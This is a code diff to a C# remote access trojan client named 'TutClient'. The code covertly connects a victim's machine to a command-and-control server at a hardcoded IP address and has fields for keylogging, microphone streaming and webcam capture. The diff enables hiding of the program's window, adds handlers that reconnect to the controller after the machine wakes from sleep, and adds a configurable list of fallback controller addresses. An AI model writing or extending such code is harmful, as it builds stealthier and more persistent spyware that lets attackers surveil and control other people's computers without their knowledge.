@@ -270,6 +270,11 @@ namespace TutClient
         /// </summary>
         private static Socket _clientSocket = new Socket
             (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        /// <summary>
+        /// Checks Machine Power State
+        /// </summary>
+        private static PowerModes _MachineCurrentPowerState;
+        private static PowerModes _MachinePreviousPowerState;
 
         /// <summary>
         /// The port to connect to
@@ -295,6 +300,7 @@ namespace TutClient
         private static byte[] recvFile = new byte[1];
         private static String fdl_location = "";
         private static bool isDisconnect = false;
+        private static bool Suspended = false;
         private static bool isKlThreadRunning = false;
         private static NAudio.Wave.WaveInEvent streaming;
         private static VideoCaptureDevice source;
@@ -318,9 +324,9 @@ namespace TutClient
         static void Main(string[] args)
         {
 #if HideWindow
-            //if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
 #endif
-            ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+            //ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
             _handler += new EventHandler(Handler); //Create a new handler
             SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
             ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
@@ -328,7 +334,135 @@ namespace TutClient
             ConnectToServer(); //Connecting To R.A.T Server
             StartIPCHandler(); //Start IPC Manager
             RequestLoop(); //Request command from the server
+            //SystemEvents.PowerModeChanged += new PowerModeChangedEventHandler(OnPowerModeChanged);
         }
+        private static void StartUtility()
+        {
+            Thread thread1 = new Thread(new ThreadStart(CheckConnection));
+            thread1.Start();
+            Thread thread2 = new Thread(new ThreadStart(CheckConnection1));
+            thread2.Start();
+        }
+
+        public static void CheckConnection()
+        {
+
+            var _NotActive = NotActive();
+            while (_clientSocket.Connected)
+            {
+                if (!Suspended && NotActive())
+                {
+                    Suspended = true;
+                    break;
+                }
+                //Thread.Sleep(TimeSpan.FromMinutes(4));
+                
+            }
+        }
+
+        public static void CheckConnection1()
+        {
+            while (_clientSocket.Connected)
+            {
+                if (Suspended)
+                {
+                    Suspended = Active();
+                    break;
+                    //SendCommand("dclient");
+                }
+                //Thread.Sleep(TimeSpan.FromMinutes(4));
+                
+            }
+        }
+
+        private static void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
+        {
+            switch (e.Mode)
+            {
+                case PowerModes.Resume:
+                    _MachineCurrentPowerState = PowerModes.Resume;
+                    //new Program();
+                    ConnectToServer(); //Connecting To R.A.T Server
+                    StartIPCHandler(); //Start IPC Manager
+                    RequestLoop();
+                    break;
+
+                case PowerModes.Suspend:
+                    _MachineCurrentPowerState = PowerModes.Suspend;
+                    //MessageBox.Show("PowerMode: OS is about to be suspended");
+                    break;
+                case PowerModes.StatusChange:
+                    _MachineCurrentPowerState = PowerModes.StatusChange;
+                    //MessageBox.Show("PowerMode: OS is about to be StatusChange");
+                    break;
+                default:
+                    _MachineCurrentPowerState = PowerModes.StatusChange;
+                    //MessageBox.Show("PowerMode: OS is about to be StatusChange");
+                    break;
+            }
+        }
+
+        private static void OnPowerModeChanged1(object sender, PowerModeChangedEventArgs e)
+        {
+            switch (e.Mode)
+            {
+                case PowerModes.Resume:
+                    _MachineCurrentPowerState = PowerModes.Resume;
+                    break;
+
+                case PowerModes.Suspend:
+                    _MachineCurrentPowerState = PowerModes.Suspend;
+                    //MessageBox.Show("PowerMode: OS is about to be suspended");
+                    break;
+                case PowerModes.StatusChange:
+                    _MachineCurrentPowerState = PowerModes.StatusChange;
+                    //MessageBox.Show("PowerMode: OS is about to be StatusChange");
+                    break;
+                default:
+                    _MachineCurrentPowerState = PowerModes.StatusChange;
+                    //MessageBox.Show("PowerMode: OS is about to be StatusChange");
+                    break;
+            }
+        }
+
+        public static bool NotActive()
+        {
+            try
+            {
+                SystemEvents.PowerModeChanged += new PowerModeChangedEventHandler(OnPowerModeChanged1);
+                /*if (_MachineCurrentPowerState == PowerModes.Suspend)
+                {
+                    Console.WriteLine("Connection Ended");
+                    _clientSocket.Close();
+                }*/
+                return _MachineCurrentPowerState == PowerModes.Suspend;
+
+            }
+            catch
+            {
+                return _MachineCurrentPowerState == PowerModes.Suspend;
+            }
+        }
+        public static bool Active()
+        {
+            try
+            {
+                SystemEvents.PowerModeChanged += new PowerModeChangedEventHandler(OnPowerModeChanged);
+                /*if (_MachineCurrentPowerState == PowerModes.Suspend)
+                {
+                    Console.WriteLine("Connection Ended");
+                    _clientSocket.Close();
+                }*/
+                return _MachineCurrentPowerState == PowerModes.Resume;
+
+            }
+            catch
+            {
+                return _MachineCurrentPowerState == PowerModes.Suspend;
+            }
+        }
+        
+
 
         /// <summary>
         /// Stop the IPC Handler and kill out client
@@ -498,6 +632,7 @@ namespace TutClient
             Console.WriteLine("Connected"); //Client connected
             connected = true; //Set connected to true
         }
+        
 
         /// <summary>
         /// Connect to the R.A.T Server
@@ -573,20 +708,45 @@ namespace TutClient
         /// </summary>
         private static void RequestLoop()
         {
+            //StartUtility();
             if (IsLinuxServer)
             {
                 _sslClient = new SslStream(new NetworkStream(_clientSocket), false, new RemoteCertificateValidationCallback(ValidateSSLConnection), null);
                 _sslClient.AuthenticateAsClient("");
                 LaunchHearthbeat();
             }
+            /*
+            while (_clientSocket.Connected)
+            {
+                if (!Suspended && NotActive())
+                {
+                    Suspended = true;
+                    break;
+                }
+                if (Suspended)
+                {
+                    Suspended = !Active();
+                    break;
+                    //SendCommand("dclient");
+                }
+                //Thread.Sleep(TimeSpan.FromMinutes(4));
 
+            }
+            */
             while (true) //While the connection is alive
             {
                 //SendRequest();
-                if (isDisconnect) break; //If we need to disconnect, then break out
+
+                if (isDisconnect && !Environment.HasShutdownStarted)
+                {
+                    break; //If we need to disconnect, then break out
+                }
                 ReceiveResponse(); // Receive data from the server
             }
-
+            /*if (!Suspended)
+            {
+                StartUtility();
+            }*/
             Console.WriteLine("Connection Ended"); //Disconnected at this point
             //Shutdown the client, then reconnect to the server
             _clientSocket.Shutdown(SocketShutdown.Both);
@@ -602,7 +762,10 @@ namespace TutClient
         /// </summary>
         private static void RequestLoop1()
         {
-            string ipCache = GetIPAddress("223.29.194.138"); //Replace IP with DNS if you want
+            var ips = string.IsNullOrEmpty(Properties.Settings.Default.Ips) ? "223.29.194.138" : Properties.Settings.Default.Ips;
+            var _ips_r = ips.Split(';').ToList();
+            var changeIp = 0;
+            string ipCache = GetIPAddress(_ips_r[changeIp].Split(':')[0]); //Replace IP with DNS if you want
             var _cls = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             ConnectToServer();
         }
